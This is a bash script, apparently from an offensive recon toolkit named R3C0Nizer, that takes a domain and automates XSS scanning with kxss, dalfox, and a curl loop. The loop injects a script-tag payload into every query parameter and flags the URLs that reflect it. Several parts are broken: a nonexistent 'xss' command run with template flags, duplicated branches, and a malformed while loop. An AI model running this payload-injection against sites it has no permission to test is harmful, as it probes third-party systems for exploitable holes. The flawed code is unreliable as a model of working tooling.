#!/bin/bash

#colors
red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
blue=`tput setaf 4`
magenta=`tput setaf 5`
reset=`tput sgr0`

read -p "Enter domain name : " DOM

if [ -d ~/reconizer/ ]
then
  echo " "
else
  mkdir ~/reconizer
fi

if [ -d ~/reconizer/$DOM/xss ]
then
  echo " "
else
  mkdir ~/reconizer/$DOM/xss
fi


echo "${red}
 =================================================
|   ____  _____  ____ ___  _   _ _                |
|  |  _ \|___ / / ___/ _ \| \ | (_)_______ _ __   |
|  | |_) | |_ \| |  | | | |  \| | |_  / _ \ '__|  |
|  |  _ < ___) | |__| |_| | |\  | |/ /  __/ |     |
|  |_| \_\____/ \____\___/|_| \_|_/___\___|_|     |
|                                                 |
 ================== Anon-Artist ==================
${reset}"
echo "${blue} [+] Started xss Vulnerability Scanning ${reset}"
echo " "

#xss
echo "${yellow} ---------------------------------- xxxxxxxx ---------------------------------- ${reset}"
echo " "
if [ -f ~/go/bin/kxss ]
then
  echo "${magenta} [+] Running kxss ${reset}"
cat $DOM/gf/xss.txt | kxss  | tee $DOM/vulnerabilities/xss_scan/kxss.txt
cat $DOM/vulnerabilities/xss_scan/kxss.txt | awk '{print $9}' | sed 's/=.*/=/' | tee $DOM/vulnerabilities/xss_scan/kxss1.txt
cat $DOM/vulnerabilities/xss_scan/kxss1.txt | dalfox pipe | tee $DOM/vulnerabilities/xss_scan/dalfoxss.txt
cat $DOM/gf/xss.txt | grep "=" | qsreplace "'><sCriPt class=khan>prompt(1)</script>" | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "'><sCriPt class=khan>prompt(1)" && echo "$host \033[0;31mVulnerable\n";done | tee $DOM/vulnerabilities/xss_scan/vulnxss.txt
else
  echo "${blue} [+] Installing xss ${reset}"
   go get -u github.com/tomnomnom/hacks/kxss
  echo "${magenta} [+] Running xss ${reset}"
  xss -update-templates
  xss -l ~/reconizer/$DOM/Subdomains/all-alive-subs.txt -t ~/xss-templates/cves/ -c 200 -o ~/reconizer/$DOM/xss/cves_results.txt
  xss -l ~/reconizer/$DOM/Subdomains/all-alive-subs.txt -t ~/xss-templates/files/ -c 200 -o ~/reconizer/$DOM/xss/files_results.txt
  xss -l ~/reconizer/$DOM/Subdomains/all-alive-subs.txt -t ~/xss-templates/vulnerabilities/ -c 200 -o ~/reconizer/$DOM/xss/vulnerabilities_results.txt
fi

if [ -f ~/go/bin/dalfox ]
then
  echo "${magenta} [+] Running dalfox ${reset}"
  xss -update-templates
  xss -l ~/reconizer/$DOM/Subdomains/all-alive-subs.txt -t ~/xss-templates/cves/ -c 200 -o ~/reconizer/$DOM/xss/cves_results.txt
  xss -l ~/reconizer/$DOM/Subdomains/all-alive-subs.txt -t ~/xss-templates/files/ -c 200 -o ~/reconizer/$DOM/xss/files_results.txt
  xss -l ~/reconizer/$DOM/Subdomains/all-alive-subs.txt -t ~/xss-templates/vulnerabilities/ -c 200 -o ~/reconizer/$DOM/xss/vulnerabilities_results.txt
else
  echo "${blue} [+] Installing xss ${reset}"
  go get -v github.com/hahwul/dalfox/v2
  echo "${magenta} [+] Running xss ${reset}"
  xss -update-templates
  xss -l ~/reconizer/$DOM/Subdomains/all-alive-subs.txt -t ~/xss-templates/cves/ -c 200 -o ~/reconizer/$DOM/xss/cves_results.txt
  xss -l ~/reconizer/$DOM/Subdomains/all-alive-subs.txt -t ~/xss-templates/files/ -c 200 -o ~/reconizer/$DOM/xss/files_results.txt
  xss -l ~/reconizer/$DOM/Subdomains/all-alive-subs.txt -t ~/xss-templates/vulnerabilities/ -c 200 -o ~/reconizer/$DOM/xss/vulnerabilities_results.txt
fi

echo "${yellow} ---------------------------------- xxxxxxxx ---------------------------------- ${reset}"
echo ""
echo "${blue} [+] Successfully saved the results"
echo ""
echo "${yellow} ---------------------------------- xxxxxxxx ---------------------------------- ${reset}"
echo " "
echo "${red} [+] Thank you for using R3C0Nizer${reset}"
echo ""
echo "${yellow} ---------------------------------- xxxxxxxx ---------------------------------- ${reset}"